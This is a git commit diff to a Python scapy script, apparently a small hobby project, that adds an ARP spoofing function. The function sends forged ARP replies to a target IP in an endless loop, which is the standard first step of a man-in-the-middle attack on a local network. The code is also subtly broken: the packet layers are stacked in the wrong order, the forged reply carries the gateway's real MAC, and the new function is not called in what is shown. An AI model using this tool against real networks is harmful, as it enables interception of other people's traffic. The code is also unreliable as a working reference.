7a7ca8ce9b34fcd663d1d8c7472c49010b8278e6
xzz501 <xzz501@github.com>
2025-08-09 08:31:44 +1100

    start send arp spoofing to target

--- main.py
+++ main.py
@@ -1,9 +1,10 @@
 
 import scapy.all as sc
 import optparse
+import time
 def get_arguments():
     par=optparse.OptionParser()
-    par.add_option("-t","--taget",dest="target_ip" ,help="target IP")
+    par.add_option("-t","--target",dest="target_ip" ,help="target IP")
     par.add_option("-r", "--router", dest="getway_ip", help="getway  IP")
     opt=par.parse_args()
     if not opt.target_ip:
@@ -12,13 +13,22 @@ def get_arguments():
         par.error("[-] please enter ip of getway")
     return opt
 opt=get_arguments()
+spoof_ip=opt.getway_ip
+target_ip=opt.target_ip
 def get_macaddress(ip):
     arp_requst=sc.ARP(pdst=ip)
     arp_broadcast=sc.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_requst_bro=arp_requst/arp_broadcast
     anw=sc.srp(arp_requst_bro,timeout=1,verbose=False)[0]
     return anw[0][1].hwsrc
-
+def spoof(targer_ip,spoof_ip):
+    targer_mac=get_macaddress(targer_ip)
+    spoof_mac=get_macaddress(spoof_ip)
+    aro_response=sc.ARP(op=2,pdst=targer_ip,hwdst=targer_mac,psrc=spoof_ip,hwsrc=spoof_mac)
+    while True:
+        time.sleep(2)
+        sc.send(aro_response,verbose=False)
+        print("start spoofing")
 
 
 
